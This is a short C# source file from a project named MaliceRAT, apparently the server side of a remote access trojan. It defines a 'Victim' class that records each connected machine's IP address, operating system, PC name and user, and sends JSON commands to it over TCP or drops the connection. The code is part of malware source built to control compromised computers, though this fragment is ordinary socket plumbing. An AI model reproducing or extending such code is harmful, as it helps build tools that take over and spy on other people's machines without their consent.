using System.Net.Sockets;
using System.Web.Script.Serialization;
using System.Text;
using System.Threading.Tasks;

namespace MaliceRAT.RatServer
{
    public class Victim
    {
        public string IP { get; set; }
        public string OS { get; set; }
        public TcpClient TcpClient { get; private set; }
        public int Id { get; set; }
        public string PC { get; set; }
        public string User { get; set; }

        public Victim(TcpClient client, int id)
        {
            TcpClient = client;
            IP = client.Client.RemoteEndPoint.ToString().Split(':')[0];
            
            OS = "N/A";
            Id = id;
            PC = "N/A";
            User = "N/A";
        }

        public void Send(dynamic json)
        {
            JavaScriptSerializer serializer = new JavaScriptSerializer();
            string jsonString = serializer.Serialize(json);
            TcpClient.Client.Send(Encoding.ASCII.GetBytes(jsonString));
        }
        
        public async Task SendAsync(dynamic json)
        {
            JavaScriptSerializer serializer = new JavaScriptSerializer();
            string jsonString = serializer.Serialize(json);
            byte[] data = Encoding.ASCII.GetBytes(jsonString);
            await TcpClient.GetStream().WriteAsync(data, 0, data.Length);
        }

        public void Disconnect()
        {
            TcpClient.Close();
        }
    }
}